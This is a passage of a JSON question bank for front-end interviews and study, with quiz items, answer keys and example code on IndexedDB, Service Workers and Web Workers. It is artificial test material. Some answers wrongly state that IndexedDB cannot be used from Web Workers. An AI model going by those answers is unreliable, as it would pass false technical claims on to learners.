            "question_web_worker_flashcard_2"
          ],
          "relatedTasks": [
            "task_web_worker_heavy_computation",
            "task_web_worker_progress_reporting"
          ],
          "tags": [
            "Web Workers",
            "Concurrency",
            "Background Threads",
            "Performance",
            "Asynchronous JavaScript",
            "Web APIs"
          ],
          "technology": "Web APIs",
          "prerequisites": [
            "Asynchronous JavaScript",
            "Event Handling"
          ],
          "complexity": 6,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "requiredFor": [
            "High-Performance Web Applications",
            "Complex Data Processing",
            "Real-time Applications"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_indexeddb_mcq_1",
          "topic": "IndexedDB Characteristics",
          "level": "easy",
          "type": "mcq",
          "question": "Which of the following is NOT a key characteristic of IndexedDB?",
          "answer": "Synchronous API that blocks the main thread",
          "options": [
            "Persistence between sessions",
            "Supports complex data structures (including blobs)",
            "Synchronous API that blocks the main thread",
            "Provides transactions and indexes for data integrity and search"
          ],
          "analysisPoints": [
            "IndexedDB is designed to be asynchronous to prevent blocking the main thread and ensure a responsive user interface.",
            "It stores data persistently across browser sessions.",
            "It can handle various complex data structures beyond simple key-value pairs.",
            "Transactions and indexes are fundamental features for data management and efficient querying."
          ],
          "keyConcepts": [
            "IndexedDB",
            "Asynchronous",
            "Persistence",
            "Transactions"
          ],
          "evaluationCriteria": [
            "Understanding of fundamental IndexedDB properties",
            "Ability to distinguish correct vs. incorrect characteristics"
          ],
          "example": "IndexedDB's asynchronous nature is crucial for smooth web application performance. Operations return `IDBRequest` objects, and results are handled via `onsuccess` or `onerror` callbacks, ensuring the main thread remains free.",
          "tags": [
            "IndexedDB",
            "Fundamentals",
            "Characteristics"
          ],
          "prerequisites": [
            "Asynchronous JavaScript"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_indexeddb_open_1",
          "topic": "IndexedDB `onupgradeneeded` Event",
          "level": "medium",
          "type": "open",
          "question": "Explain the purpose of the `onupgradeneeded` event in IndexedDB. When does it get triggered, and what operations are typically performed within its handler?",
          "answer": "The `onupgradeneeded` event in IndexedDB is a crucial lifecycle event that gets triggered under two main conditions: (1) when the database is being created for the first time, or (2) when a database is being opened with a version number higher than its current version. Its primary purpose is to allow for schema changes, such as creating, deleting, or modifying object stores and indexes. This is the *only* place where these structural changes can be made within an IndexedDB database. Operations typically performed within the `onupgradeneeded` handler include `db.createObjectStore()` to define new object stores, specifying `keyPath` or `autoIncrement` options, and `objectStore.createIndex()` to create indexes for efficient data retrieval. It's also used for migrating existing data when the schema changes.",
          "analysisPoints": [
            "Understanding of IndexedDB versioning and schema migration.",
            "Knowledge of when `onupgradeneeded` is triggered.",
            "Ability to list specific IndexedDB API calls that can only be made within this event.",
            "Importance of this event for database evolution and data integrity."
          ],
          "keyConcepts": [
            "IndexedDB",
            "Database Versioning",
            "onupgradeneeded",
            "ObjectStore",
            "Index"
          ],
          "evaluationCriteria": [
            "Detailed explanation of the event's purpose and trigger conditions",
            "Correct identification of allowed operations within the handler"
          ],
          "example": "```javascript\nconst request = indexedDB.open('MyDatabase', 2); // Version changed from 1 to 2\n\nrequest.onupgradeneeded = function(event) {\n  const db = event.target.result;\n  // This is where schema changes happen\n  if (!db.objectStoreNames.contains('products')) {\n    const productStore = db.createObjectStore('products', { keyPath: 'productId' });\n    productStore.createIndex('category', 'category', { unique: false });\n  }\n  // If version 1 existed, you might migrate data here\n  console.log('Database upgrade or creation in progress...');\n};\n\nrequest.onsuccess = function(event) {\n  console.log('Database opened/upgraded successfully.');\n};\n```",
          "tags": [
            "IndexedDB",
            "Database Schema",
            "Lifecycle",
            "API"
          ],
          "prerequisites": [
            "IndexedDB Basics"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_indexeddb_code_1",
          "topic": "IndexedDB Basic CRUD Operations",
          "level": "medium",
          "type": "code",
          "question": "Write JavaScript code to open an IndexedDB database named 'ProductsDB' (version 1), create an object store 'products' with 'id' as keyPath, add a product `{ id: 1, name: 'Laptop', price: 1200 }`, and then retrieve it by its ID. Ensure proper error handling.",
          "answer": "// See solutionCode in task_indexeddb_crud_manager for a more comprehensive example.",
          "options": [],
          "analysisPoints": [
            "Correct use of `indexedDB.open()`.",
            "Proper handling of `onupgradeneeded` for object store creation.",
            "Correct initiation of a `readwrite` transaction.",
            "Successful `add()` and `get()` operations on the object store.",
            "Appropriate error handling for all requests."
          ],
          "keyConcepts": [
            "IndexedDB",
            "CRUD",
            "Transactions",
            "Event Handlers"
          ],
          "evaluationCriteria": [
            "Functional IndexedDB setup",
            "Accurate data insertion and retrieval",
            "Robust error management"
          ],
          "example": "```javascript\nfunction performIndexedDBOperations() {\n  const request = indexedDB.open('ProductsDB', 1);\n\n  request.onupgradeneeded = function(event) {\n    const db = event.target.result;\n    if (!db.objectStoreNames.contains('products')) {\n      db.createObjectStore('products', { keyPath: 'id' });\n      console.log('Object store \"products\" created.');\n    }\n  };\n\n  request.onsuccess = function(event) {\n    const db = event.target.result;\n    const transaction = db.transaction(['products'], 'readwrite');\n    const objectStore = transaction.objectStore('products');\n\n    // Add data\n    const productToAdd = { id: 1, name: 'Laptop', price: 1200 };\n    const addRequest = objectStore.add(productToAdd);\n    addRequest.onsuccess = () => console.log('Product added:', productToAdd);\n    addRequest.onerror = (e) => console.error('Error adding product:', e.target.error);\n\n    // Get data\n    const getRequest = objectStore.get(1);\n    getRequest.onsuccess = function(event) {\n      const product = event.target.result;\n      console.log('Product retrieved:', product);\n    };\n    getRequest.onerror = (e) => console.error('Error retrieving product:', e.target.error);\n\n    transaction.oncomplete = () => db.close();\n    transaction.onerror = (e) => console.error('Transaction error:', e.target.error);\n  };\n\n  request.onerror = function(event) {\n    console.error('Database open error:', event.target.errorCode);\n  };\n}\n\n// Call the function to execute operations\nperformIndexedDBOperations();\n```",
          "tags": [
            "IndexedDB",
            "Code Challenge",
            "CRUD"
          ],
          "prerequisites": [
            "IndexedDB Basics",
            "JavaScript Event Listeners"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_indexeddb_flashcard_1",
          "topic": "IndexedDB KeyPath",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the purpose of `keyPath` when creating an IndexedDB object store?",
          "answer": "`keyPath` specifies the property of the JavaScript object that should be used as the unique identifier (primary key) for records in the object store. If a `keyPath` is not provided, you must explicitly provide a key when adding records. It ensures that each record can be uniquely identified and retrieved.",
          "options": [],
          "analysisPoints": [
            "Understanding of how records are identified in IndexedDB.",
            "Knowledge of `keyPath`'s role in uniqueness and retrieval."
          ],
          "keyConcepts": [
            "IndexedDB",
            "keyPath",
            "Object Store"
          ],
          "evaluationCriteria": [
            "Accurate definition of `keyPath`'s role"
          ],
          "example": "",
          "tags": [
            "IndexedDB",
            "Definition",
            "Key Concepts"
          ],
          "prerequisites": [
            "IndexedDB Basics"
          ],
          "complexity": 2,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_indexeddb_mcq_2",
          "topic": "IndexedDB Transactions",
          "level": "medium",
          "type": "mcq",
          "question": "When performing multiple operations (e.g., adding, updating, deleting) in IndexedDB, why is it crucial to group them within a single transaction?",
          "answer": "To ensure atomicity, meaning either all operations succeed or none of them do",
          "options": [
            "To make the operations run synchronously and block the UI",
            "To bypass the need for defining object stores and indexes",
            "To ensure atomicity, meaning either all operations succeed or none of them do",
            "To allow direct DOM manipulation from the database context"
          ],
          "analysisPoints": [
            "Transactions in IndexedDB provide atomicity, consistency, isolation, and durability (ACID properties) for database operations.",
            "Atomicity means a transaction is treated as a single, indivisible unit of work.",
            "If any operation within a transaction fails, the entire transaction is rolled back, preventing partial data updates.",
            "Transactions do not make operations synchronous; they are still asynchronous but atomic."
          ],
          "keyConcepts": [
            "IndexedDB",
            "Transactions",
            "Atomicity",
            "Data Integrity"
          ],
          "evaluationCriteria": [
            "Understanding of transaction properties",
            "Ability to identify the core benefit of transactions"
          ],
          "example": "```javascript\n// A single transaction for multiple updates\nconst transaction = db.transaction(['customers'], 'readwrite');\nconst objectStore = transaction.objectStore('customers');\n\nconst customer1 = { id: 1, name: 'Alice', email: 'alice@example.com' };\nconst customer2 = { id: 2, name: 'Bob', email: 'bob@example.com' };\n\nobjectStore.put(customer1); // Add/update Alice\nobjectStore.put(customer2); // Add/update Bob\n\n// If 'bob@example.com' was unique: true and an existing record already used this email,\n// the second put() might fail, causing the entire transaction to abort, \n// and Alice's record would not be added/updated either.\n\ntransaction.oncomplete = () => console.log('All operations in transaction completed.');\ntransaction.onerror = (e) => console.error('Transaction failed:', e.target.error); // Handles rollback\n```",
          "tags": [
            "IndexedDB",
            "Transactions",
            "Data Integrity"
          ],
          "prerequisites": [
            "IndexedDB Basics"
          ],
          "complexity": 5,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_indexeddb_open_2",
          "topic": "IndexedDB vs. LocalStorage",
          "level": "hard",
          "type": "open",
          "question": "Compare and contrast IndexedDB and LocalStorage, highlighting their suitable use cases and key technical differences.",
          "answer": "IndexedDB and LocalStorage are both client-side storage mechanisms, but they differ significantly in capabilities and use cases.\n\n**LocalStorage:**\n- **Type**: Simple key-value store.\n- **Data Structure**: Stores only strings. Complex objects must be manually serialized (e.g., `JSON.stringify()`) and deserialized (`JSON.parse()`).\n- **API**: Synchronous. Operations block the main thread, making it unsuitable for large data or frequent access.\n- **Storage Limit**: Small (typically 5-10 MB).\n- **Features**: No transactions, no indexing, no advanced querying.\n- **Use Cases**: Storing small amounts of simple data, user preferences, session information, or temporary data that doesn't require complex queries or high integrity.\n\n**IndexedDB:**\n- **Type**: Full-fledged NoSQL, transactional database system.\n- **Data Structure**: Stores structured data directly (JavaScript objects, Blobs, Files). No manual serialization needed.\n- **API**: Asynchronous. Operations are non-blocking, ensuring UI responsiveness, suitable for large datasets.\n- **Storage Limit**: Large (hundreds of MBs, potentially GBs).\n- **Features**: Supports transactions (ACID properties), object stores, and indexes for efficient searching and data integrity. Allows for cursor-based iteration.\n- **Use Cases**: Storing large volumes of structured data, offline applications (PWAs), caching large assets (e.g., images, video), complex data management, or applications requiring robust data integrity.\n\n**Key Technical Differences:**\n1.  **API Nature**: LocalStorage is synchronous; IndexedDB is asynchronous.\n2.  **Data Type**: LocalStorage stores strings; IndexedDB stores JavaScript objects/structured data.\n3.  **Storage Limit**: LocalStorage has a small limit; IndexedDB has a much larger limit.\n4.  **Complexity**: LocalStorage is simpler; IndexedDB is more complex with robust features.\n5.  **Transactions/Indexing**: IndexedDB supports these, LocalStorage does not.",
          "analysisPoints": [
            "Detailed comparison across multiple dimensions (data type, API, limit, features).",
            "Clear identification of suitable use cases for each.",
            "Demonstrates understanding of the underlying technical differences (synchronicity, data model)."
          ],
          "keyConcepts": [
            "IndexedDB",
            "LocalStorage",
            "Client-Side Storage",
            "Asynchronous vs. Synchronous",
            "Data Structure",
            "Use Cases"
          ],
          "evaluationCriteria": [
            "Comprehensive comparison",
            "Accuracy of technical details",
            "Relevance of use cases"
          ],
          "example": "A typical scenario for `localStorage` might be saving a user's theme preference (`localStorage.setItem('theme', 'dark')`), while `IndexedDB` would be used for storing all messages in an offline chat application or a large product catalog.",
          "tags": [
            "IndexedDB",
            "LocalStorage",
            "Comparison",
            "Client-Side Storage",
            "Architecture"
          ],
          "prerequisites": [
            "IndexedDB Basics",
            "LocalStorage Basics"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_indexeddb_flashcard_2",
          "topic": "IndexedDB Index Purpose",
          "level": "medium",
          "type": "flashcard",
          "question": "What is the primary purpose of creating an index in IndexedDB?",
          "answer": "The primary purpose of creating an index in IndexedDB is to allow for efficient searching and retrieval of records based on properties other than the object store's primary key (`keyPath`). Indexes enable fast lookups and range queries on specific fields, improving query performance, similar to how indexes work in traditional relational databases.",
          "options": [],
          "analysisPoints": [
            "Understanding that indexes facilitate searching on non-key fields.",
            "Knowledge of performance implications for queries.",
            "Comparison to traditional database indexing concepts."
          ],
          "keyConcepts": [
            "IndexedDB",
            "Index",
            "Searching",
            "Performance"
          ],
          "evaluationCriteria": [
            "Accurate explanation of index utility"
          ],
          "example": "",
          "tags": [
            "IndexedDB",
            "Index",
            "Performance",
            "Concepts"
          ],
          "prerequisites": [
            "IndexedDB Basics"
          ],
          "complexity": 4,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_service_worker_mcq_1",
          "topic": "Service Worker Purpose",
          "level": "easy",
          "type": "mcq",
          "question": "What is the primary benefit of using a Service Worker in a web application?",
          "answer": "Enabling offline capabilities and improved performance through caching",
          "options": [
            "Blocking the main thread for heavy computations",
            "Directly manipulating the DOM from a background script",
            "Enabling offline capabilities and improved performance through caching",
            "Providing real-time communication with a backend server via WebSockets"
          ],
          "analysisPoints": [
            "Service Workers act as a programmable network proxy, intercepting requests to provide cached content for offline access.",
            "Caching assets leads to faster load times and better performance for repeat visits.",
            "They run in a separate thread and do not block the main thread.",
            "They do not have direct DOM access.",
            "While Service Workers can facilitate push notifications, their primary benefit for user experience is offline support and caching, which leads to performance gains."
          ],
          "keyConcepts": [
            "Service Workers",
            "Offline",
            "Caching",
            "Performance",
            "PWA"
          ],
          "evaluationCriteria": [
            "Understanding the core value proposition of Service Workers",
            "Distinguishing primary benefits from unrelated or incorrect features"
          ],
          "example": "When a user visits a website with a Service Worker enabled, even if their internet connection drops, the Service Worker can serve previously cached content, allowing them to continue browsing without seeing a 'No Internet Connection' page.",
          "tags": [
            "Service Workers",
            "Benefits",
            "PWA",
            "Caching"
          ],
          "prerequisites": [
            "Basic Web Concepts"
          ],
          "complexity": 3,
          "interviewFrequency": 8,
          "learningPath": "beginner"
        },
        {
          "id": "question_service_worker_open_1",
          "topic": "Service Worker Lifecycle",
          "level": "medium",
          "type": "open",
          "question": "Describe the basic lifecycle of a Service Worker, including the key events (`install`, `activate`, `fetch`) and their typical uses.",
          "answer": "The Service Worker lifecycle involves several key phases:\n\n1.  **Registration**: The main thread script registers the Service Worker using `navigator.serviceWorker.register('service-worker.js')`.\n2.  **Installation (`install` event)**: This event fires when the Service Worker is first installed. It's typically used to pre-cache static assets (like HTML, CSS, JS files, images) that are essential for the application's basic functionality, using `event.waitUntil()` and `caches.addAll()`.\n3.  **Activation (`activate` event)**: This event fires after the installation is successful and when the Service Worker is ready to take control of pages. It's commonly used for cleanup, such as deleting old caches from previous Service Worker versions, using `caches.delete()`.\n4.  **Fetching (`fetch` event)**: Once activated, the Service Worker can intercept network requests from controlled pages. The `fetch` event listener is triggered for every HTTP request. Inside this listener, the Service Worker decides how to respond: serving from cache (`caches.match()`), fetching from the network (`fetch(event.request)`), or implementing caching strategies like 'cache-first' or 'network-first'.\n\nAn important aspect is that a new Service Worker will install in the background but will only activate once all existing pages controlled by the old Service Worker are closed.",
          "analysisPoints": [
            "Accurate description of each lifecycle phase.",
            "Correct identification of the event listeners (`install`, `activate`, `fetch`).",
            "Understanding of the typical operations performed within each event.",
            "Knowledge of how new Service Workers activate (waiting for old ones to unload)."
          ],
          "keyConcepts": [
            "Service Workers",
            "Lifecycle",
            "Install Event",
            "Activate Event",
            "Fetch Event",
            "Caching Strategies"
          ],
          "evaluationCriteria": [
            "Comprehensive and accurate explanation of the lifecycle",
            "Correct usage of event names and their purposes"
          ],
          "example": "```javascript\n// In service-worker.js\nself.addEventListener('install', (event) => {\n  console.log('Installing Service Worker...');\n  event.waitUntil(caches.open('app-shell-v1').then((cache) => {\n    return cache.addAll(['/', '/index.html', '/css/styles.css']);\n  }));\n});\n\nself.addEventListener('activate', (event) => {\n  console.log('Activating Service Worker...');\n  event.waitUntil(caches.keys().then((cacheNames) => {\n    return Promise.all(cacheNames.map((name) => {\n      if (name !== 'app-shell-v1') { return caches.delete(name); }\n    }));\n  }));\n});\n\nself.addEventListener('fetch', (event) => {\n  event.respondWith(caches.match(event.request).then((response) => {\n    return response || fetch(event.request);\n  }));\n});\n```",
          "tags": [
            "Service Workers",
            "Lifecycle",
            "Events",
            "PWA"
          ],
          "prerequisites": [
            "Asynchronous JavaScript",
            "Promises"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_service_worker_code_1",
          "topic": "Service Worker Fetch Event",
          "level": "medium",
          "type": "code",
          "question": "Write the conceptual JavaScript code for a Service Worker's `fetch` event handler that implements a 'Network-first, then cache' caching strategy. This means it should try to fetch from the network first. If the network request fails, it should then try to serve from the cache.",
          "answer": "// See solutionCode in task_service_worker_dynamic_caching for a more comprehensive example.",
          "options": [],
          "analysisPoints": [
            "Correctly using `self.addEventListener('fetch', ...)`.",
            "Understanding and implementing the 'network-first' logic with `fetch()` and `caches.match()`.",
            "Proper use of `event.respondWith()` and Promises (`.then()`, `.catch()`)."
          ],
          "keyConcepts": [
            "Service Workers",
            "Fetch Event",
            "Caching Strategies",
            "Promises",
            "Network"
          ],
          "evaluationCriteria": [
            "Correct implementation of the caching strategy",
            "Appropriate use of asynchronous patterns"
          ],
          "example": "```javascript\n// In service-worker.js\nself.addEventListener('fetch', event => {\n  event.respondWith(\n    fetch(event.request)\n      .then(response => {\n        // If network request is successful, clone and put into cache, then return response\n        const responseToCache = response.clone();\n        caches.open('dynamic-cache').then(cache => {\n          cache.put(event.request, responseToCache);\n        });\n        return response;\n      })\n      .catch(() => {\n        // Network failed, try to get from cache\n        return caches.match(event.request);\n      })\n  );\n});\n```",
          "tags": [
            "Service Workers",
            "Code Challenge",
            "Caching"
          ],
          "prerequisites": [
            "Service Worker Basics",
            "Promises"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_service_worker_flashcard_1",
          "topic": "Service Worker HTTPS Requirement",
          "level": "easy",
          "type": "flashcard",
          "question": "Why are Service Workers restricted to running over HTTPS (or `localhost`)?",
          "answer": "Service Workers have significant power, as they can intercept network requests and potentially modify responses. This makes them a security risk if used over unencrypted HTTP, as a Man-in-the-Middle attacker could inject malicious content or intercept sensitive data. HTTPS ensures that the Service Worker script delivered to the browser is authentic and hasn't been tampered with, protecting user data and maintaining the integrity of the application.",
          "options": [],
          "analysisPoints": [
            "Understanding of Service Worker capabilities (network interception).",
            "Recognition of the security implications on HTTP.",
            "Importance of HTTPS for integrity and confidentiality."
          ],
          "keyConcepts": [
            "Service Workers",
            "HTTPS",
            "Security",
            "Man-in-the-Middle"
          ],
          "evaluationCriteria": [
            "Accurate explanation of the security rationale"
          ],
          "example": "",
          "tags": [
            "Service Workers",
            "Security",
            "HTTPS",
            "Concepts"
          ],
          "prerequisites": [
            "Basic Web Security"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_service_worker_mcq_2",
          "topic": "Create React App Service Worker",
          "level": "easy",
          "type": "mcq",
          "question": "In a `create-react-app` project, what is the purpose of the `serviceWorker.register()` call in `index.js`?",
          "answer": "To enable offline capabilities by installing a default Service Worker that caches static assets",
          "options": [
            "To explicitly disable any Service Worker functionality for the application",
            "To enable offline capabilities by installing a default Service Worker that caches static assets",
            "To allow direct access to the DOM from the background thread of the Service Worker",
            "To establish a WebSocket connection for real-time updates"
          ],
          "analysisPoints": [
            "`create-react-app` bundles a default Service Worker (Workbox-based) for offline functionality.",
            "Calling `serviceWorker.register()` initiates the installation and activation process for this default worker.",
            "The primary function is to pre-cache built static assets, making the application available offline or on slow networks.",
            "`unregister()` is used to disable, not `register()`."
          ],
          "keyConcepts": [
            "Service Workers",
            "Create React App",
            "Offline",
            "Caching",
            "PWA"
          ],
          "evaluationCriteria": [
            "Understanding of CRA's Service Worker integration",
            "Correct identification of the `register()` function's effect"
          ],
          "example": "```javascript\n// In index.js of a create-react-app project\nimport * as serviceWorker from './serviceWorker';\n// ... other imports and ReactDOM.render\nserviceWorker.register(); // This line activates the offline features.\n```",
          "tags": [
            "Service Workers",
            "React",
            "Create React App",
            "Offline"
          ],
          "prerequisites": [
            "React Basics"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_service_worker_open_2",
          "topic": "Service Worker Caching Strategies",
          "level": "hard",
          "type": "open",
          "question": "Beyond simple 'cache-first' or 'network-first', explain a more advanced Service Worker caching strategy like 'stale-while-revalidate' and describe a scenario where it would be beneficial.",
          "answer": "The 'stale-while-revalidate' caching strategy is a hybrid approach that provides a good balance between performance and freshness. Here's how it works:\n\n1.  **Serve from Cache (Stale)**: When a request is made, the Service Worker immediately checks its cache. If a cached response exists for that request, it returns that 'stale' cached response instantly to the client.\n2.  **Revalidate from Network (Fresh)**: In parallel to serving the stale response, the Service Worker also makes a network request for the same resource. Once the network response arrives, it updates the cache with the new, fresh version for future requests.\n\n**Scenario where it's beneficial:**\nConsider a news feed or social media application. Users want to see content quickly, but they also want it to be reasonably up-to-date. Using 'stale-while-revalidate' provides an excellent user experience:\n-   **Initial Load/Offline**: If the user is offline or has a slow connection, they immediately see the previously cached news articles (even if a few minutes old), preventing a blank screen or a long loading spinner.\n-   **Subsequent Loads (Online)**: While the user is viewing the slightly 'stale' articles, the Service Worker fetches the latest news in the background. The next time the user loads the page or navigates to that section, they will get the freshest version of the content. This ensures a fast initial load while keeping the content reasonably current. This strategy is ideal for content that doesn't need to be absolutely real-time but benefits from quick display and eventual freshness.",
          "analysisPoints": [
            "Clear definition of 'stale-while-revalidate' mechanism.",
            "Identification of the two parallel processes (serving stale, revalidating fresh).",
            "Detailed explanation of a relevant use case.",
            "Demonstrates understanding of balancing performance and data freshness."
          ],
          "keyConcepts": [
            "Service Workers",
            "Caching Strategies",
            "Stale-While-Revalidate",
            "Performance",
            "User Experience",
            "PWA"
          ],
          "evaluationCriteria": [
            "Accurate explanation of the strategy",
            "Compelling and well-explained use case",
            "Demonstrates advanced understanding of caching"
          ],
          "example": "```javascript\n// In service-worker.js\nself.addEventListener('fetch', event => {\n  event.respondWith(\n    caches.match(event.request).then(cachedResponse => {\n      const networkFetch = fetch(event.request).then(response => {\n        // Put a copy of the response in the cache\n        const responseToCache = response.clone();\n        caches.open('dynamic-content-cache').then(cache => {\n          cache.put(event.request, responseToCache);\n        });\n        return response;\n      }).catch(() => {\n        // Network failed, if no cache, return fallback or error\n        return new Response('Offline and no cached data', { status: 503 });\n      });\n\n      // Return cached response immediately if available, otherwise wait for network\n      return cachedResponse || networkFetch;\n    })\n  );\n});\n```",
          "tags": [
            "Service Workers",
            "Caching Strategies",
            "Advanced",
            "Performance",
            "UX"
          ],
          "prerequisites": [
            "Service Worker Lifecycle",
            "Promises",
            "HTTP Caching"
          ],
          "complexity": 8,
          "interviewFrequency": 7,
          "learningPath": "expert"
        },
        {
          "id": "question_service_worker_flashcard_2",
          "topic": "Service Worker Cache API",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the name of the API Service Workers use for storing and retrieving network responses?",
          "answer": "The Cache Storage API (accessible via `caches` global object in the Service Worker context).",
          "options": [],
          "analysisPoints": [
            "Knowledge of the specific API for Service Worker caching."
          ],
          "keyConcepts": [
            "Service Workers",
            "Cache API",
            "Caching"
          ],
          "evaluationCriteria": [
            "Correct identification of the API"
          ],
          "example": "",
          "tags": [
            "Service Workers",
            "API",
            "Caching"
          ],
          "prerequisites": [
            "Service Worker Basics"
          ],
          "complexity": 2,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_web_worker_mcq_1",
          "topic": "Web Worker Benefits",
          "level": "easy",
          "type": "mcq",
          "question": "What is the primary benefit of using a Web Worker?",
          "answer": "Performing computationally intensive tasks without blocking the main UI thread",
          "options": [
            "Directly manipulating the DOM from a background thread",
            "Performing computationally intensive tasks without blocking the main UI thread",
            "Enabling push notifications for web applications",
            "Synchronously storing large amounts of data in the browser"
          ],
          "analysisPoints": [
            "Web Workers are designed to run scripts in a separate background thread.",
            "This separation prevents heavy computations from freezing the user interface, improving responsiveness.",
            "Web Workers explicitly do NOT have direct DOM access.",
            "Push notifications are a Service Worker feature, not a general Web Worker feature.",
            "IndexedDB is for large data storage, and it's asynchronous, not synchronous, and not directly accessed by Web Workers."
          ],
          "keyConcepts": [
            "Web Workers",
            "Main Thread",
            "Concurrency",
            "Performance"
          ],
          "evaluationCriteria": [
            "Understanding the core purpose of Web Workers",
            "Distinguishing from other Web APIs or incorrect functionalities"
          ],
          "example": "If you have to calculate prime numbers up to a very large number, doing it directly on the main thread would freeze your webpage. Offloading this task to a Web Worker allows the user to continue interacting with the page.",
          "tags": [
            "Web Workers",
            "Benefits",
            "Performance"
          ],
          "prerequisites": [
            "Asynchronous JavaScript"
          ],
          "complexity": 3,
          "interviewFrequency": 8,
          "learningPath": "beginner"
        },
        {
          "id": "question_web_worker_open_1",
          "topic": "Web Worker Limitations",
          "level": "medium",
          "type": "open",
          "question": "List and explain at least three significant limitations of Web Workers.",
          "answer": "Web Workers operate in an isolated environment, leading to several limitations:\n\n1.  **No Direct DOM Access**: Web Workers cannot directly access or manipulate the Document Object Model (DOM). This is because they run in a separate thread and do not have access to the `window` object, which is required for DOM manipulation. All UI updates or interactions must be handled by the main thread, with workers sending messages to the main thread to request such actions.\n2.  **Limited Global Scope**: Web Workers do not have access to many global objects and functions available on the main thread, such as `window`, `document`, `parent`, `localStorage`, `sessionStorage`, `IndexedDB` (directly), or `alert()`. They have their own global scope, `self`.\n3.  **Cross-Origin Restrictions**: A Web Worker script must be loaded from the same origin as the parent page. You cannot directly load a worker script from a different domain (unless specific CORS headers are configured, but even then, communication might be restricted for security reasons).\n4.  **No Shared Memory (Data Copying)**: Communication between the main thread and a worker (and between workers) happens via message passing (`postMessage()`). The data sent is copied, not shared, meaning a structured clone algorithm is used. For very large data, this copying can introduce overhead, though transferable objects can mitigate this.",
          "analysisPoints": [
            "Accurate identification of key limitations.",
            "Clear explanation for each limitation (e.g., why no DOM access).",
            "Demonstrates understanding of the worker's isolated environment."
          ],
          "keyConcepts": [
            "Web Workers",
            "Limitations",
            "DOM Access",
            "Global Scope",
            "Cross-Origin",
            "Message Passing"
          ],
          "evaluationCriteria": [
            "Comprehensive list of limitations",
            "Detailed and correct explanations"
          ],
          "example": "If a Web Worker computes a list of filtered items, it cannot directly inject them into a `<ul>` element. Instead, it must `postMessage()` the filtered list back to the main thread, which then receives it via `onmessage` and updates the DOM.",
          "tags": [
            "Web Workers",
            "Limitations",
            "Architecture"
          ],
          "prerequisites": [
            "Web Workers Basics"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_web_worker_code_1",
          "topic": "Web Worker Communication",
          "level": "medium",
          "type": "code",
          "question": "Create two files: `main.html` and `calculation.js`. In `main.html`, use a Web Worker to calculate the factorial of a given number (e.g., 1000). The main thread should send the number to the worker, and the worker should send the result back. Display the result on the console in the main thread.",
          "answer": "// See solutionCode in task_web_worker_heavy_computation for a more comprehensive example.",
          "options": [],
          "analysisPoints": [
            "Correct instantiation of `Worker` in the main thread.",
            "Proper use of `worker.postMessage()` and `worker.onmessage` for communication.",
            "Correct implementation of `self.onmessage` and `self.postMessage()` in the worker script.",
            "Ability to handle a basic computation within the worker."
          ],
          "keyConcepts": [
            "Web Workers",
            "Message Passing",
            "postMessage",
            "onmessage"
          ],
          "evaluationCriteria": [
            "Functional communication between main thread and worker",
            "Correct data transfer and handling"
          ],
          "example": "```html\n<!-- main.html -->\n<!DOCTYPE html>\n<html>\n<head><title>Factorial Worker</title></head>\n<body>\n  <script>\n    const worker = new Worker('calculation.js');\n    worker.onmessage = function(event) {\n      console.log('Result from worker:', event.data);\n    };\n    worker.postMessage(1000);\n  </script>\n</body>\n</html>\n```\n\n```javascript\n// calculation.js\nself.onmessage = function(event) {\n  const number = event.data;\n  let result = 1n; // Use BigInt for large numbers\n  for (let i = 2n; i <= BigInt(number); i++) {\n    result *= i;\n  }\n  self.postMessage(result.toString());\n};\n```",
          "tags": [
            "Web Workers",
            "Code Challenge",
            "Communication"
          ],
          "prerequisites": [
            "Web Workers Basics",
            "Asynchronous JavaScript"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_web_worker_flashcard_1",
          "topic": "Web Worker Communication Methods",
          "level": "easy",
          "type": "flashcard",
          "question": "How do the main thread and a Web Worker communicate with each other?",
          "answer": "They communicate through an asynchronous message-passing system. The `postMessage()` method is used to send data from one context to another, and the `onmessage` event handler (or `addEventListener('message', ...)` listener) is used to receive incoming messages.",
          "options": [],
          "analysisPoints": [
            "Knowledge of `postMessage` and `onmessage`."
          ],
          "keyConcepts": [
            "Web Workers",
            "Message Passing",
            "postMessage",
            "onmessage"
          ],
          "evaluationCriteria": [
            "Accurate description of communication mechanism"
          ],
          "example": "",
          "tags": [
            "Web Workers",
            "Communication",
            "Concepts"
          ],
          "prerequisites": [
            "Web Workers Basics"
          ],
          "complexity": 2,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_web_worker_mcq_2",
          "topic": "Web Worker Global Scope",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following objects or APIs is NOT directly accessible within a standard Web Worker's global scope?",
          "answer": "document",
          "options": [
            "self",
            "fetch",
            "console",
            "document"
          ],
          "analysisPoints": [
            "`self` refers to the worker's own global scope.",
            "The `fetch` API is available in workers for making network requests.",
            "`console` for logging is available.",
            "The `document` object, representing the DOM, is *not* available in Web Workers because they run in a separate thread without direct access to the UI."
          ],
          "keyConcepts": [
            "Web Workers",
            "Global Scope",
            "Limitations",
            "DOM Access"
          ],
          "evaluationCriteria": [
